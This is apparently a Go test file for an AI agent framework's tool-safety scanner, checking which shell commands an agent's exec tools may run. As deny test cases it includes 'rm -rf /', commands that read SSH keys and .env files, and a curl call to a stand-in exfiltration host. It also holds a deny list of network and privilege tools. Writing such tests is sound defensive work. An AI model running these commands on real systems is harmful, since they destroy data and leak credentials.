@@ -1,0 +1,355 @@
+//
+// Tencent is pleased to support the open source community by making
+// trpc-agent-go available.
+//
+// Copyright (C) 2025 Tencent.  All rights reserved.
+//
+// trpc-agent-go is licensed under the Apache License Version 2.0.
+//
+
+package safety
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"testing"
+
+	"github.com/stretchr/testify/require"
+)
+
+func TestScannerAcceptanceSamples(t *testing.T) {
+	p := DefaultPolicy()
+	p.DeniedCommands = []string{
+		"rm", "nc", "ssh", "sudo",
+		"apt", "apt-get", "npm", "pip", "pip3",
+	}
+	s := NewScanner(p)
+
+	tests := []struct {
+		name     string
+		req      Request
+		decision Decision
+		rule     string
+	}{
+		{
+			name: "safe go test",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "go test ./tool/safety",
+			},
+			decision: DecisionAllow,
+		},
+		{
+			name: "dangerous delete",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "rm -rf /",
+			},
+			decision: DecisionDeny, rule: ruleDangerousDelete,
+		},
+		{
+			name: "read secret",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "cat ~/.ssh/id_rsa",
+			},
+			decision: DecisionDeny, rule: ruleSensitivePath,
+		},
+		{
+			name: "network denied",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl https://evil.example/steal",
+			},
+			decision: DecisionDeny, rule: ruleNetworkEgress,
+		},
+		{
+			name: "network allowed",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl https://github.com/trpc-group/trpc-agent-go",
+			},
+			decision: DecisionAllow,
+		},
+		{
+			name: "shell wrapper",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: `sh -c "echo hi"`,
+			},
+			decision: DecisionAsk, rule: ruleShellWrapper,
+		},
+		{
+			name: "pipeline",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "cat go.mod | wc -l",
+			},
+			decision: DecisionAsk, rule: rulePipeline,
+		},
+		{
+			name: "dependency install",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "go install example.com/tool@latest",
+			},
+			decision: DecisionAsk, rule: ruleDependencyInstall,
+		},
+		{
+			name: "long running",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "sleep 120",
+			},
+			decision: DecisionAsk, rule: ruleResourceRuntime,
+		},
+		{
+			name: "huge output",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "yes",
+			},
+			decision: DecisionAsk, rule: ruleResourceOutput,
+		},
+		{
+			name: "hostexec long session",
+			req: Request{
+				ToolName: "hostexec_exec_command", Backend: BackendHostExec,
+				Command: "go test ./...", TTY: true, Background: true,
+			},
+			decision: DecisionAsk, rule: ruleHostSession,
+		},
+		{
+			name: "ask review parse error",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "echo $(whoami)",
+			},
+			decision: DecisionAsk, rule: ruleParseError,
+		},
+		{
+			name: "sensitive output",
+			req: Request{
+				ToolName: "execute_code", Backend: BackendCodeExec,
+				CodeBlocks: []CodeBlock{{
+					Language: "python",
+					Code:     `print("token=sk-secret")`,
+				}},
+			},
+			decision: DecisionDeny, rule: ruleSecretLeakage,
+		},
+		{
+			name: "large concurrency",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "go test -parallel 256 ./...",
+			},
+			decision: DecisionAsk, rule: ruleResourceConcurrent,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			report := s.Scan(context.Background(), tt.req)
+			require.Equal(t, tt.decision, report.Decision)
+			require.NotEmpty(t, report.RiskLevel)
+			require.NotZero(t, report.ScannedAt)
+			if tt.rule != "" {
+				require.NotEmpty(t, report.Findings)
+				require.Equal(t, tt.rule, report.Findings[0].RuleID)
+				require.NotEmpty(t, report.Findings[0].Evidence)
+				require.NotEmpty(t, report.Findings[0].Recommendation)
+			}
+		})
+	}
+}
+
+func TestScannerAcceptanceRates(t *testing.T) {
+	s := NewScanner(DefaultPolicy())
+	safe := []Request{
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "go test ./tool/safety"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "curl https://github.com/trpc-group/trpc-agent-go"},
+	}
+	unsafe := []Request{
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "rm -rf /"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "cat ~/.ssh/id_rsa"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "cat .env"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "curl https://evil.example/steal"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: `sh -c "echo hi"`},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "go install example.com/tool@latest"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "sleep 120"},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "yes"},
+		{ToolName: "hostexec_exec_command", Backend: BackendHostExec, Command: "go test ./...", TTY: true},
+		{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "echo token=sk-secret"},
+	}
+
+	falsePositives := 0
+	for _, req := range safe {
+		if s.Scan(context.Background(), req).Decision != DecisionAllow {
+			falsePositives++
+		}
+	}
+	detected := 0
+	for _, req := range unsafe {
+		if s.Scan(context.Background(), req).Decision != DecisionAllow {
+			detected++
+		}
+	}
+	require.GreaterOrEqual(t, float64(detected)/float64(len(unsafe)), 0.90)
+	require.LessOrEqual(t, float64(falsePositives)/float64(len(safe)), 0.10)
+}
+
+func TestScannerHonorsCancelledContext(t *testing.T) {
+	var audit bytes.Buffer
+	scanner := NewScanner(
+		DefaultPolicy(),
+		WithAuditSink(NewWriterAuditSink(&audit)),
+	)
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel()
+
+	report := scanner.Scan(ctx, Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "go test ./tool/safety",
+	})
+
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.True(t, report.Blocked)
+	require.True(t, hasRule(report, ruleContextCancelled), report.Findings)
+	require.Contains(t, audit.String(), ruleContextCancelled)
+}
+
+func TestScannerHonorsContextCancelledDuringCommandScan(t *testing.T) {
+	ctx := &delayedCancelContext{
+		Context:     context.Background(),
+		cancelAfter: 2,
+	}
+	report := NewScanner(DefaultPolicy()).Scan(ctx, Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "cat .env",
+	})
+
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.True(t, hasRule(report, ruleContextCancelled), report.Findings)
+	require.False(t, hasRule(report, ruleSensitivePath), report.Findings)
+}
+
+func TestScannerOutputHonorsCancelledContext(t *testing.T) {
+	var audit bytes.Buffer
+	scanner := NewScanner(
+		DefaultPolicy(),
+		WithAuditSink(NewWriterAuditSink(&audit)),
+	)
+	ctx, cancel := context.WithCancel(context.Background())
+	cancel()
+
+	report := scanner.ScanOutput(ctx, Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+	}, "token=sk-12345678901234567890")
+
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.True(t, report.Blocked)
+	require.True(t, hasRule(report, ruleContextCancelled), report.Findings)
+	require.Contains(t, audit.String(), ruleContextCancelled)
+}
+
+func TestScannerConcurrentScansShareAuditSinkSafely(t *testing.T) {
+	var audit bytes.Buffer
+	scanner := NewScanner(
+		DefaultPolicy(),
+		WithAuditSink(NewWriterAuditSink(&audit)),
+	)
+
+	const scans = 16
+	var wg sync.WaitGroup
+	reports := make(chan Report, scans)
+	for i := 0; i < scans; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			command := "go test ./tool/safety"
+			if i%2 == 1 {
+				command = "cat .env"
+			}
+			reports <- scanner.Scan(context.Background(), Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			})
+		}(i)
+	}
+	wg.Wait()
+	close(reports)
+
+	gotReports := 0
+	for report := range reports {
+		gotReports++
+		require.NotZero(t, report.ScannedAt)
+	}
+	require.Equal(t, scans, gotReports)
+
+	lines := strings.Split(strings.TrimSpace(audit.String()), "\n")
+	require.Len(t, lines, scans)
+}
+
+func TestFileAuditSinkConcurrentWrites(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "tool_safety_audit.jsonl")
+	sink := NewFileAuditSink(path)
+
+	const writes = 64
+	var wg sync.WaitGroup
+	errs := make(chan error, writes)
+	for i := 0; i < writes; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			errs <- sink.WriteAudit(AuditEvent{
+				ToolName:   "workspace_exec",
+				Backend:    BackendWorkspaceExec,
+				Decision:   DecisionAllow,
+				RiskLevel:  RiskLow,
+				DurationMS: int64(i),
+			})
+		}(i)
+	}
+	wg.Wait()
+	close(errs)
+	for err := range errs {
+		require.NoError(t, err)
+	}
+
+	raw, err := os.ReadFile(path)
+	require.NoError(t, err)
+	lines := strings.Split(strings.TrimSpace(string(raw)), "\n")
+	require.Len(t, lines, writes)
+	for _, line := range lines {
+		var ev AuditEvent
+		require.NoError(t, json.Unmarshal([]byte(line), &ev), line)
+		require.Equal(t, "workspace_exec", ev.ToolName)
+		require.Equal(t, DecisionAllow, ev.Decision)
+	}
+}
+
+type delayedCancelContext struct {
+	context.Context
+	checks      atomic.Int32
+	cancelAfter int32
+}
+
+func (c *delayedCancelContext) Err() error {
+	if c.checks.Add(1) > c.cancelAfter {
+		return context.Canceled
+	}
+	return nil
+}
+
+func (c *delayedCancelContext) Done() <-chan struct{} { return nil }
